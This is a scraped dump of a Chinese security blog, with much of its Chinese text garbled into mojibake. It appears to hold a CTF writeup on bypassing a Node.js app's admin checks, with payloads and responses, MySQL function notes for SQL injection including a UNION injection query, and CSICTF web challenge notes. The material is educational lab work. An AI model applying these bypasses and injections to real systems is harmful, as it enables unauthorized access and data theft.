md5 = require(&quot;md5&quot;);const jwt = require(&quot;express-jwt&quot;);const jsonwebtoken = require(&quot;jsonwebtoken&quot;);const server = require(&quot;http&quot;).createServer(app);const &#123; flag, secret, jwtSecret &#125; = require(&quot;./flag&quot;);const config = &#123; port: process.env.PORT || 8081, adminValue: 1000, message: &quot;Can you get flag?&quot;, secret: secret, adminUsername: &quot;kirakira_dokidoki&quot;, whitelist: [&quot;/&quot;, &quot;/login&quot;, &quot;/init&quot;, &quot;/source&quot;],&#125;;let users = &#123; 0: &#123; username: config.adminUsername, isAdmin: true, rights: Object.keys(config) &#125;&#125;;app.use(express.json());app.use(cors());app.use( jwt(&#123; secret: jwtSecret &#125;).unless(&#123; path: config.whitelist &#125;));app.use(function(error, req, res, next) &#123; if (error.name === &quot;UnauthorizedError&quot;) &#123; res.json(err(&quot;Invalid token or not logged in.&quot;)); &#125;&#125;);function sign(o) &#123; return jsonwebtoken.sign(o, jwtSecret);&#125;function ok(data = &#123;&#125;) &#123; return &#123; status: &quot;ok&quot;, data: data &#125;;&#125;function err(msg = &quot;Something went wrong.&quot;) &#123; return &#123; status: &quot;error&quot;, message: msg &#125;;&#125;function isValidUser(u) &#123; return ( u.username.length &gt;= 6 &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toUpperCase() &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toLowerCase() );&#125;function isAdmin(u) &#123; return (u.username.toUpperCase() === config.adminUsername.toUpperCase() &amp;&amp; u.username.toUpperCase() === config.adminUsername.toLowerCase()) || u.isAdmin;&#125;function checkRights(arr) &#123; let blacklist = [&quot;secret&quot;, &quot;port&quot;]; if(blacklist.includes(arr)) &#123; return false; &#125; for (let i = 0; i &lt; arr.length; i++) &#123; const element = arr[i]; if (blacklist.includes(element)) &#123; return false; &#125; &#125; return true;&#125;app.get(&quot;/&quot;, (req, res) =&gt; &#123; res.json(ok(&#123; hint: &quot;You can get source code from /source&quot;&#125;));&#125;);app.get(&quot;/source&quot;, (req, res) =&gt; &#123; res.sendFile( __dirname + &quot;/&quot; + &quot;app.js&quot;);&#125;);app.post(&quot;/login&quot;, (req, res) =&gt; &#123; let u = &#123; username: req.body.username, id: uuidv4(), value: Math.random() &lt; 0.0000001 ? 100000000 : 100, isAdmin: false, rights: [ &quot;message&quot;, &quot;adminUsername&quot; ] &#125;; if (isValidUser(u)) &#123; users[u.id] = u; res.send(ok(&#123; token: sign(&#123; id: u.id &#125;) &#125;)); &#125; else &#123; res.json(err(&quot;Invalid creds&quot;)); &#125;&#125;);app.post(&quot;/init&quot;, (req, res) =&gt; &#123; let &#123; secret &#125; = req.body; let target = md5(config.secret.toString()); let adminId = md5(secret) .split(&quot;&quot;) .map((c, i) =&gt; c.charCodeAt(0) ^ target.charCodeAt(i)) .reduce((a, b) =&gt; a + b); res.json(ok(&#123; token: sign(&#123; id: adminId &#125;) &#125;));&#125;);// Get server infoapp.get(&quot;/serverInfo&quot;, (req, res) =&gt; &#123; let user = users[req.user.id] || &#123; rights: [] &#125;; let info = user.rights.map(i =&gt; (&#123; name: i, value: config[i] &#125;)); res.json(ok(&#123; info: info &#125;));&#125;);app.post(&quot;/becomeAdmin&quot;, (req, res) =&gt; &#123; let &#123;value&#125; = req.body; let uid = req.user.id; let user = users[uid]; let maxValue = [value, config.adminValue].sort()[1]; if(value &gt;= maxValue &amp;&amp; user.value &gt;= value) &#123; user.isAdmin = true; res.send(ok(&#123; isAdmin: true &#125;)); &#125;else&#123; res.json(err(&quot;You need pay more!&quot;)); &#125;&#125;);// only admin can update userapp.post(&quot;/updateUser&quot;, (req, res) =&gt; &#123; let uid = req.user.id; let user = users[uid]; if (!user || !isAdmin(user)) &#123; res.json(err(&quot;You&#x27;re not an admin!&quot;)); return; &#125; let rights = req.body.rights || []; if (rights.length &gt; 0 &amp;&amp; checkRights(rights)) &#123; users[uid].rights = user.rights.concat(rights).filter((value, index, self)=&gt;&#123; return self.indexOf(value) === index; &#125;); &#125; res.json(ok(&#123; user: users[uid] &#125;));&#125;);// only uid===0 can get the flagapp.get(&quot;/flag&quot;, (req, res) =&gt; &#123; if (req.user.id == 0) &#123; res.send(ok(&#123; flag: flag &#125;)); &#125; else &#123; res.send(err(&quot;Unauthorized&quot;)); &#125;&#125;);server.listen(config.port, () =&gt; console.log(`Server listening on port $&#123;config.port&#125;!`)); åŸºæœ¬æ€è·¯ åˆ©ç”¨javascriptå¤§å°å†™ç‰¹æ€§ä½¿ç”¨ç®¡ç†å‘˜çš„ç”¨æˆ·åç™»å½• ä½¿ç”¨å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡isAdminåˆ¤æ–­ ç»™ç”¨æˆ·æ·»åŠ æŸ¥çœ‹secretçš„æƒé™å¹¶æŸ¥çœ‹secretçš„å€¼ é€šè¿‡èµ‹å€¼secretå°†adminIdè®¾ç½®ä¸º0 è·å–Flag ç¬¬ä¸€æ­¥ loginAPIç”¨javascriptå¤§å°å†™ç‰¹æ€§ç»•è¿‡ï¼Œpayload 1&#123;&quot;username&quot;:&quot;â„ªÄ±rakira_dokidoki&quot;&#125; å›æ˜¾tokençš„å€¼ 1&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVkMWNlYmU1LTFiZWItNDA4Yi05YzE2LTViOGQ0NmM4ODIzMCIsImlhdCI6MTU5NjE4MTUyOH0.uyZInKJWeJ7mr290HKV5Z41Pf6_aCjPvvDEKkvanbtk&quot;&#125;&#125; ç¬¬äºŒæ­¥ becomeAdminAPIä½¿ç”¨å­—ç¬¦ä¸²ç»•è¿‡ 1&#123;&quot;value&quot;: &quot;11&quot;&#125; å›æ˜¾ï¼š 1&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125; ç¬¬ä¸‰æ­¥ ä½¿ç”¨æ•°ç»„ç»•è¿‡updateUserAPI 1&#123;&quot;rights&quot;:[[&quot;secret&quot;]]&#125; å›æ˜¾ 1&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;user&quot;:&#123;&quot;username&quot;:&quot;â„ªÄ±rakira_dokidoki&quot;,&quot;id&quot;:&quot;ed1cebe5-1beb-408b-9c16-5b8d46c88230&quot;,&quot;value&quot;:100,&quot;isAdmin&quot;:true,&quot;rights&quot;:[&quot;message&quot;,&quot;adminUsername&quot;,[&quot;secret&quot;]]&#125;&#125;&#125; ç¬¬å››æ­¥ ç›´æ¥è®¿é—®serverInfoè·å–secretçš„å€¼ï¼Œå›æ˜¾ 1&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;info&quot;:[&#123;&quot;name&quot;:&quot;message&quot;,&quot;value&quot;:&quot;Can you get flag?&quot;&#125;,&#123;&quot;name&quot;:&quot;adminUsername&quot;,&quot;value&quot;:&quot;kirakira_dokidoki&quot;&#125;,&#123;&quot;name&quot;:[&quot;secret&quot;],&quot;value&quot;:&quot;1145141919810&quot;&#125;]&#125;&#125; ç¬¬äº”æ­¥ è®¿é—®initAPIï¼Œpayload 1&#123;&quot;secret&quot;:&quot;1145141919810&quot;&#125; å›æ˜¾ 1&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTk2MTg3MDk4fQ.Fdfrcfvnxjdh54WcTbu79nqKFv1dcucBCAoTJenw52I&quot;&#125;&#125; ç¬¬å…­æ­¥ æŠŠåˆšåˆšè·å¾—åˆ°çš„id=0çš„tokenæ›¿æ¢ä¹‹å‰çš„tokenå¾—åˆ°flagã€‚ å‚è€ƒï¼šhttps://xz.aliyun.com/t/7177","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"SQLæ³¨å…¥ä¸“é¡¹ä¹‹MySQLåŸºç¡€æ“ä½œ","date":"2020-07-31T01:03:21.000Z","path":"Web_security/basic_learning/22.SQLæ³¨å…¥ä¸“é¡¹ä¹‹MySQLåŸºç¡€æ³¨å…¥è¯­æ³•/","text":"SQLæ³¨å…¥ä¸“é¡¹ä¹‹MySQLåŸºç¡€æ³¨å…¥è¯­æ³• åŸºæœ¬ä¸Šæ‘˜è‡ªk0rz3nå¸ˆå‚…çš„ä¸€ç¯‡æ–‡ç« ï¼Œæ—¥å¸¸è†œã€‚ å­—ç¬¦ä¸²æ“ä½œ åˆå¹¶å­—ç¬¦ä¸² concat 1234567mysql&gt; select concat(&#39;hel&#39;,&#39;lo&#39;,&#39;world&#39;);+----------------------------+| concat(&#39;hel&#39;,&#39;lo&#39;,&#39;world&#39;) |+----------------------------+| helloworld |+----------------------------+1 row in set (0.00 sec) concat_ws 1234567mysql&gt; select concat_ws(&#39;+&#39;, &#39;hello&#39;, &#39;world&#39;);+----------------------------------+| concat_ws(&#39;+&#39;, &#39;hello&#39;, &#39;world&#39;) |+----------------------------------+| hello+world |+----------------------------------+1 row in set (0.00 sec) æˆªå–å­—ç¬¦ä¸² substræˆ–substringæˆ–mid 1234567mysql&gt; select substring(&#39;www.baidu.com&#39;,&#39;5&#39;,5);+----------------------------------+| substring(&#39;www.baidu.com&#39;,&#39;5&#39;,5) |+----------------------------------+| baidu |+----------------------------------+1 row in set (0.00 sec) left 1234567mysql&gt; select left(&#39;flag&#123;this_is_test&#125;&#39;, 5);+-------------------------------+| left(&#39;flag&#123;this_is_test&#125;&#39;, 5) |+-------------------------------+| flag&#123; |+-------------------------------+1 row in set (0.00 sec) right 1234567mysql&gt; select right(&#39;flag&#123;this_is_test&#125;&#39;, 5);+--------------------------------+| right(&#39;flag&#123;this_is_test&#125;&#39;, 5) |+--------------------------------+| test&#125; |+--------------------------------+1 row in set (0.00 sec) substring_index 1234567891011121314151617181920212223mysql&gt; select substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,1);+-----------------------------------------------------+| substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,1) |+-----------------------------------------------------+| flag&#123;111111 |+-----------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-1);+------------------------------------------------------+| substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-1) |+------------------------------------------------------+| 333333&#125; |+------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-2);+------------------------------------------------------+| substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-2) |+------------------------------------------------------+| 222222-333333&#125; |+------------------------------------------------------+1 row in set (0.00 sec) è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ char_length()/character_length() å’Œ length()/octet_length() 123456789101112131415mysql&gt; select char_length(&#39;ä½ å¥½&#39;);+-----------------------+| char_length(&#39;ä½ å¥½&#39;) |+-----------------------+| 2 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select length(&#39;ä½ å¥½&#39;);+------------------+| length(&#39;ä½ å¥½&#39;) |+------------------+| 6 |+------------------+1 row in set (0.01 sec) char_length()/character_length() è®¡ç®—çš„æ˜¯å­—ç¬¦çš„ä¸ªæ•°ï¼Œè€Œlength()/octet_length() è®¡ç®—çš„æ˜¯å­—èŠ‚çš„é•¿åº¦ æ”¹å˜å­˜å‚¨çš„å­—ç¬¦ä¸² å°† colname åˆ—çš„åŒå¼•å·æ¢æˆå•å¼•å· 1replace(colname,&#39;&quot;&#39;,&#39;\\&#39;&#39;); æŸ¥æ‰¾å­å­—ç¬¦ä¸²åœ¨å­—ç¬¦ä¸²ä¸­çš„ä½ç½® locate locate(substr, str) 123456789101112131415mysql&gt; select locate(&#39;bar&#39;, &#39;foobar&#39;);+-------------------------+| locate(&#39;bar&#39;, &#39;foobar&#39;) |+-------------------------+| 4 |+-------------------------+1 row in set (0.00 sec)mysql&gt; select locate(&#39;xbar&#39;, &#39;foobar&#39;);+--------------------------+| locate(&#39;xbar&#39;, &#39;foobar&#39;) |+--------------------------+| 0 |+--------------------------+1 row in set (0.00 sec) locate(substr, str, pos)/position 1234567mysql&gt; select locate(&#39;bar&#39;, &#39;foobarbar&#39;, 5);+-------------------------------+| locate(&#39;bar&#39;, &#39;foobarbar&#39;, 5) |+-------------------------------+| 7 |+-------------------------------+1 row in set (0.00 sec) instr 123456789101112131415mysql&gt; select instr(&#39;123&#39;, &#39;12&#39;);+--------------------+| instr(&#39;123&#39;, &#39;12&#39;) |+--------------------+| 1 |+--------------------+1 row in set (0.00 sec)mysql&gt; select instr(&#39;123&#39;, &#39;4&#39;);+-------------------+| instr(&#39;123&#39;, &#39;4&#39;) |+-------------------+| 0 |+-------------------+1 row in set (0.00 sec) find_in_set 1234567mysql&gt; select find_in_set(&#39;a&#39;,&#39;a,b,c,d,e&#39;);+------------------------------+| find_in_set(&#39;a&#39;,&#39;a,b,c,d,e&#39;) |+------------------------------+| 1 |+------------------------------+1 row in set (0.00 sec) æ­£åˆ™åŒ¹é… like å¸¸ç”¨é€šé…ç¬¦ï¼š 12345% : åŒ¹é…0ä¸ªæˆ–ä»»æ„å¤šä¸ªå­—ç¬¦_ : åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦escape ï¼š è½¬ä¹‰å­—ç¬¦ï¼Œå¯åŒ¹é…%å’Œ_ regexp/rlike å¸¸ç”¨é€šé…ç¬¦ 1234567891011. : åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦* ï¼š åŒ¹é…0ä¸ªæˆ–å¤šä¸ªå‰ä¸€ä¸ªå¾—åˆ°çš„å­—ç¬¦[] : åŒ¹é…ä»»æ„ä¸€ä¸ª[]å†…çš„å­—ç¬¦ï¼Œ[ab]*å¯åŒ¹é…ç©ºä¸²ã€aã€bã€æˆ–è€…ç”±ä»»æ„ä¸ªaå’Œbç»„æˆçš„å­—ç¬¦ä¸²ã€‚^ : åŒ¹é…å¼€å¤´ï¼Œå¦‚^såŒ¹é…ä»¥sæˆ–è€…Så¼€å¤´çš„å­—ç¬¦ä¸²ã€‚$ : åŒ¹é…ç»“å°¾ï¼Œå¦‚s$åŒ¹é…ä»¥sç»“å°¾çš„å­—ç¬¦ä¸²ã€‚&#123;n&#125; : åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦åå¤næ¬¡ã€‚ å­—ç¬¦ä¸²åŒºåˆ†å¤§å°å†™æ¯”è¾ƒ 1234567mysql&gt; select &#39;A&#39; &#x3D; binary &#39;a&#39;;+------------------+| &#39;A&#39; &#x3D; binary &#39;a&#39; |+------------------+| 0 |+------------------+1 row in set (0.01 sec) è‡ªå®šä¹‰æ’åº elt 1elt(N ,str1 ,str2 ,str3 ,â€¦) è‹¥ N = 1 ï¼Œåˆ™è¿”å›å€¼ä¸º str1 ï¼Œè‹¥ N = 2 ï¼Œåˆ™è¿”å›å€¼ä¸º str2 ï¼Œä»¥æ­¤ç±»æ¨ã€‚ è‹¥ N å°äº 1 æˆ–å¤§äºå‚æ•°çš„æ•°ç›®ï¼Œåˆ™è¿”å›å€¼ä¸º NULL ã€‚ 1234567mysql&gt; SELECT ELT(3,&#39;hello&#39;,&#39;halo&#39;,&#39;test&#39;,&#39;world&#39;);+--------------------------------------+| ELT(3,&#39;hello&#39;,&#39;halo&#39;,&#39;test&#39;,&#39;world&#39;) |+--------------------------------------+| test |+--------------------------------------+1 row in set (0.00 sec) åœ¨ç›²æ³¨ä¸­çš„åº”ç”¨ 123456789101112131415mysql&gt; select elt(1,0);+----------+| elt(1,0) |+----------+| 0 |+----------+1 row in set (0.00 sec)mysql&gt; select elt(1,1);+----------+| elt(1,1) |+----------+| 1 |+----------+1 row in set (0.00 sec) field 1FIELD(str, str1, str2, str3, â€¦â€¦) å­—æ®µstræŒ‰ç…§å­—ç¬¦ä¸²str1ï¼Œstr2ï¼Œstr3ï¼Œstr4çš„é¡ºåºè¿”å›æŸ¥è¯¢åˆ°çš„ç»“æœé›†ã€‚å¦‚æœè¡¨ä¸­strå­—æ®µå€¼ä¸å­˜åœ¨äºstr1ï¼Œstr2ï¼Œstr3ï¼Œstr4ä¸­çš„è®°å½•ï¼Œæ”¾åœ¨ç»“æœé›†æœ€å‰é¢è¿”å›ã€‚ å½“ç„¶è¿™æ˜¯æ­£å¸¸çš„ç”¨æ³•ï¼Œè¿˜å¯ä»¥ç†è§£ä¸ºè¿™ä¸ªå‡½æ•°è¿”å›çš„æ˜¯str åœ¨åé¢è¿™äº›å­—ç¬¦ä¸²ä¸­çš„ç´¢å¼•ã€‚ 123456789101112131415mysql&gt; select field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;world&#39;);+--------------------------------------+| field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;world&#39;) |+--------------------------------------+| 0 |+--------------------------------------+1 row in set (0.00 sec)mysql&gt; select field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;halo&#39;,&#39;world&#39;);+---------------------------------------------+| field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;halo&#39;,&#39;world&#39;) |+---------------------------------------------+| 3 |+---------------------------------------------+1 row in set (0.00 sec) åœ¨ç›²æ³¨ä¸­çš„åº”ç”¨ 123456789101112131415mysql&gt; select field(1,0);+------------+| field(1,0) |+------------+| 0 |+------------+1 row in set (0.00 sec)mysql&gt; select field(1,1);+------------+| field(1,1) |+------------+| 1 |+------------+1 row in set (0.00 sec) è¿™é‡Œçš„ç¬¬äºŒä¸ªå‚æ•°å†³å®šäº†è¿™æ¡è¯­å¥çš„æ‰§è¡Œç»“æœã€‚ æ¡ä»¶è¡¨è¾¾å¼ ifè¯­å¥ if(condition,result1,result2) å½“ condition ç»“æœä¸ºçœŸæ—¶è¿”å› result1 å¦åˆ™è¿”å› result2,è¿™å¸¸å¸¸ç”¨ä½œæˆ‘ä»¬ç›²æ³¨çš„å¼€å…³å‡½æ•° 123456789101112131415mysql&gt; select if(1,1,0);+-----------+| if(1,1,0) |+-----------+| 1 |+-----------+1 row in set (0.00 sec)mysql&gt; select if(0,1,0);+-----------+| if(0,1,0) |+-----------+| 0 |+-----------+1 row in set (0.00 sec) caseè¯­å¥ åŸºæœ¬å½¢å¼ï¼š 1case(â€¦)whenâ€¦thenâ€¦elseâ€¦end ä¸¤ç§å˜ä½“ï¼š 1case expr when val1 then result1 when val2 then result2 else result3 end; å…ˆä¼šåˆ¤æ–­ expr çš„ç»“æœ ï¼Œå†æ ¹æ®è¯¥ç»“æœæ˜¯ val1 è¿˜æ˜¯ val2 æˆ–è€…å…¶ä»–ï¼Œæ¥æ‰§è¡Œä¸åŒçš„è¯­å¥ã€‚ 1case when condition1 then result1 when condition2 result2 else result3 end; ç›´æ¥æ ¹æ®ä¸åŒæƒ…å†µè¿›è¡Œé€‰æ‹©ã€‚ æ¯”å¦‚å¯ä»¥æ„é€ è¿™æ ·ä¸€æ¡æ³¨å…¥è¯­å¥ï¼š 1select * from test where id &#x3D;-1 union select 1,case when username like &#39;a%&#39; then 0 else 2222222222222222222 end,3,4 from tdb_admin å­æŸ¥è¯¢ è¿™ä¸€å—æˆ‘è¿˜æ²¡å¤ªçœ‹æ˜ç™½ï¼Œå…ˆæŠŠæ¨¡æ¿è´´ä¸‹æ¥ æ¨¡æ¿ä¸€ 1select ... from ... where col &#x3D; [any|all](select...); æ¨¡æ¿äºŒ 1select ....from ... where col [not]in(select...); æ¨¡æ¿ä¸‰ 1select row(value1,valu2...) &#x3D; [any&#x2F;some](select col1,col2...); æ¨¡æ¿å›› 1select ... from ...where col [not]exists(select...); æ¨¡æ¿äº” 1select ... from (select ...) as name where ...","tags":[{"name":"Webå®‰å…¨å­¦ä¹ ","slug":"Webå®‰å…¨å­¦ä¹ ","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://ca0y1h.top/tags/SQL%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"Webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"MySQLç›²æ³¨æ€»ç»“","date":"2020-07-30T01:48:40.000Z","path":"Web_security/basic_learning/23.SQLæ³¨å…¥ä¸“é¡¹ä¹‹MySQLç›²æ³¨æ€»ç»“/","text":"MySQLç›²æ³¨æ€»ç»“ æœ€è¿‘åœ¨åˆ·BUUCTFçš„æ—¶å€™ï¼Œç»å¸¸ç¢°åˆ°MySQLç›²æ³¨ï¼Œä½†æ˜¯æ¯æ¬¡ç¢°åˆ°éƒ½æœ‰ç‚¹ä¸çŸ¥é“æ€ä¹ˆä¸‹æ‰‹ï¼Œä¹Ÿçœ‹ä¸å‡ºæ¥æ˜¯å“ªç§ç±»å‹çš„æ³¨å…¥ï¼Œåœ¨æ­¤å°±æ€»ç»“ä¸€ä¸‹ã€‚ä¸»è¦æ˜¯ä¸¤ç§ç›²æ³¨æ–¹å¼ï¼š åŸºäºå¸ƒå°”çš„SQLç›²æ³¨ åŸºäºæ—¶é—´çš„SQLç›²æ³¨ 0x01 å¸ƒå°”ç›²æ³¨ ä½¿ç”¨æ¡ä»¶","tags":[],"categories":[]},{"title":"CSICTF2020","date":"2020-07-26T14:56:51.000Z","path":"Web_security/ctf_writeup/20.CSICTF2020/","text":"CSICTF2020 Web+Linux Writeup åœ¨ctfhubä¸Šé¢çœ‹åˆ°è¿™ä¸ªæ¯”èµ›ï¼Œä»‹ç»é‡Œé¢è¯´æ˜¯é¢å‘èŒæ–°çš„ï¼Œåšäº†ä¸€ä¸‹ï¼Œé¢˜ç›®ç¡®å®æ¯”è¾ƒå‹å¥½ï¼Œå¯ä»¥æ‹¿æ¥ç»ƒç»ƒæ‰‹ï¼Œè€Œä¸”åˆ°ç›®å‰ä¸ºæ­¢é¢˜ç›®ç¯å¢ƒè¿˜æ²¡æœ‰å…³é—­ã€‚å¾ˆç®€å•çš„é¢˜ç›®å°±è¯´ä¸€ä¸ªè€ƒç‚¹ç•¥è¿‡å»ã€‚ã€‚ã€‚ã€‚ https://ctf.csivit.com/challenges https://github.com/csivitu/ctf-challenges Web Warm Up è€ƒå¯ŸSHA1å¼±ç±»å‹æ¯”è¾ƒ 1234567891011121314151617181920&lt;?phpif (isset($_GET[&#x27;hash&#x27;])) &#123; if ($_GET[&#x27;hash&#x27;] === &quot;10932435112&quot;) &#123; die(&#x27;Not so easy mate.&#x27;); &#125; $hash = sha1($_GET[&#x27;hash&#x27;]); $target = sha1(10932435112); if($hash == $target) &#123; include(&#x27;flag.php&#x27;); print $flag; &#125; else &#123; print &quot;csictf&#123;loser&#125;&quot;; &#125;&#125; else &#123; show_source(__FILE__);&#125;?&gt; Cascade F12ç›´æ¥NetworkæŸ¥çœ‹CSSæ–‡ä»¶ã€‚ Oreo è€ƒå¯ŸCookie Mr Rami è¿™ä¸ªé¢˜æ˜¯çœŸçš„å‘ã€‚ã€‚ã€‚ã€‚çœŸä¼šç© ç›´æ¥æŸ¥çœ‹robot.txtå°±è¡Œã€‚ã€‚ Secure Portal è€ƒå¯ŸJSä»£ç æ··æ·† ä¸€å †è¢«æ··æ·†åçš„JSä»£ç  1var _0x575c=[&#x27;\\x32\\x2d\\x34&#x27;,&#x27;\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67&#x27;,&#x27;\\x34\\x2d\\x37&#x27;,&#x27;\\x67\\x65\\x74\\x49\\x74\\x65\\x6d&#x27;,&#x27;\\x64\\x65\\x6c\\x65\\x74\\x65\\x49\\x74\\x65\\x6d&#x27;,&#x27;\\x31\\x32\\x2d\\x31\\x34&#x27;,&#x27;\\x30\\x2d\\x32&#x27;,&#x27;\\x73\\x65\\x74\\x49\\x74\\x65\\x6d&#x27;,&#x27;\\x39\\x2d\\x31\\x32&#x27;,&#x27;\\x5e\\x37\\x4d&#x27;,&#x27;\\x75\\x70\\x64\\x61\\x74\\x65\\x49\\x74\\x65\\x6d&#x27;,&#x27;\\x62\\x62\\x3d&#x27;,&#x27;\\x37\\x2d\\x39&#x27;,&#x27;\\x31\\x34\\x2d\\x31\\x36&#x27;,&#x27;\\x6c\\x6f\\x63\\x61\\x6c\\x53\\x74\\x6f\\x72\\x61\\x67\\x65&#x27;,];(function(_0x4f0aae,_0x575cf8)&#123;var _0x51eea2=function(_0x180eeb)&#123;while(--_0x180eeb)&#123;_0x4f0aae[&#x27;push&#x27;](_0x4f0aae[&#x27;shift&#x27;]());&#125;&#125;;_0x51eea2(++_0x575cf8);&#125;(_0x575c,0x78));var _0x51ee=function(_0x4f0aae,_0x575cf8)&#123;_0x4f0aae=_0x4f0aae-0x0;var _0x51eea2=_0x575c[_0x4f0aae];return _0x51eea2;&#125;;function CheckPassword(_0x47df21)&#123;var _0x4bbdc3=[_0x51ee(&#x27;0xe&#x27;),_0x51ee(&#x27;0x3&#x27;),_0x51ee(&#x27;0x7&#x27;),_0x51ee(&#x27;0x4&#x27;),_0x51ee(&#x27;0xa&#x27;)];window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#x27;9-12&#x27;,&#x27;BE*&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x2&#x27;),_0x51ee(&#x27;0xb&#x27;));window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x6&#x27;),&#x27;5W&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#x27;16&#x27;,_0x51ee(&#x27;0x9&#x27;));window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x5&#x27;),&#x27;pg&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#x27;7-9&#x27;,&#x27;+n&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0xd&#x27;),&#x27;4t&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x0&#x27;),&#x27;$F&#x27;);if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x8&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x9,0xc))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x2&#x27;))===_0x47df21[&#x27;substring&#x27;](0x4,0x7))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x6&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x0,0x2))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](&#x27;16&#x27;)===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x10))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x5&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0xc,0xe))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0xc&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x7,0x9))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0xd&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0xe,0x10))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x0&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x2,0x4))return!![];&#125;&#125;&#125;&#125;&#125;&#125;&#125;return![];&#125; ç”¨åœ¨çº¿å·¥å…·è§£å¯†ä¸€ä¸‹ http://www.jsnice.org/ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&#x27;use strict&#x27;;/** @type &#123;!Array&#125; */var _0x575c = [&quot;2-4&quot;, &quot;substring&quot;, &quot;4-7&quot;, &quot;getItem&quot;, &quot;deleteItem&quot;, &quot;12-14&quot;, &quot;0-2&quot;, &quot;setItem&quot;, &quot;9-12&quot;, &quot;^7M&quot;, &quot;updateItem&quot;, &quot;bb=&quot;, &quot;7-9&quot;, &quot;14-16&quot;, &quot;localStorage&quot;];(function(data, i) &#123; /** * @param &#123;number&#125; selected_image * @return &#123;undefined&#125; */ var validateGroupedContexts = function fn(selected_image) &#123; for (; --selected_image;) &#123; data[&quot;push&quot;](data[&quot;shift&quot;]()); &#125; &#125;; validateGroupedContexts(++i);&#125;)(_0x575c, 120);/** * @param &#123;string&#125; ballNumber * @param &#123;?&#125; opt_target * @return &#123;?&#125; */var _0x51ee = function PocketDropEvent(ballNumber, opt_target) &#123; /** @type &#123;number&#125; */ ballNumber = ballNumber - 0; var ball = _0x575c[ballNumber]; return ball;&#125;;/** * @param &#123;!Object&#125; results * @return &#123;?&#125; */function CheckPassword(results) &#123; /** @type &#123;!Array&#125; */ var easing = [_0x51ee(&quot;0xe&quot;), _0x51ee(&quot;0x3&quot;), 